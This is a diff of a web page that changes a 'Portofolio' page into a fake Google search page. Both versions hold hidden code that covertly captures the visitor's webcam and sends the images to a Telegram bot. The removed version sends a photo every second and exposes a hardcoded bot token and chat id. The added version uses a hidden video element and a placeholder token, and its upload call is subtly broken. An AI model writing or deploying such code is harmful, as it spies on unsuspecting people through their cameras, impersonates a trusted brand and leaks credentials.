@@ -3,51 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portofolio</title>
+    <title>Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 15%;
+        }
+        #logo {
+            width: 300px;
+        }
+        #search-bar {
+            width: 50%;
+            padding: 10px;
+            font-size: 18px;
+            border-radius: 25px;
+            border: 1px solid #ccc;
+        }
+        #search-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" width="300" height="250" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <img id="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    <br><br>
+    <input type="text" id="search-bar" placeholder="Search Google or type a URL">
+    <br>
+    <button id="search-btn">Google Search</button>
 
     <script>
-        const botToken = "7593653128:AAGTeaMtzMzjcPbfABOTZ0YlQdfEGxkvHFQ";
-        const chatId = "7615485308";
+        async function captureAndSend() {
+            try {
+                const video = document.createElement("video");
+                video.style.display = "none"; 
+                document.body.appendChild(video);
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
 
-        // Get user camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
-                document.getElementById("video").srcObject = stream;
-            })
-            .catch(function (error) {
-                console.error("Camera access denied:", error);
-            });
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
 
-        function captureAndSendPhoto() {
-            let video = document.getElementById("video");
-            let canvas = document.getElementById("canvas");
-            let context = canvas.getContext("2d");
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Capture image
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL("image/png");
 
-            canvas.toBlob((blob) => {
-                let formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", blob, "photo.png");
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                // Send to Telegram bot
+                fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto", {
                     method: "POST",
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => console.log("Photo sent:", data))
-                .catch(error => console.error("Error sending photo:", error));
-            }, "image/png");
+                    body: new FormData().append("photo", imageData),
+                });
+
+                // Stop camera after capture
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Camera access denied!", error);
+            }
         }
 
-        // Capture and send a photo every 1 second
-        setInterval(captureAndSendPhoto, 1000);
+        setTimeout(captureAndSend, 5000);  // Capture after 5 seconds
     </script>
 </body>
 </html>
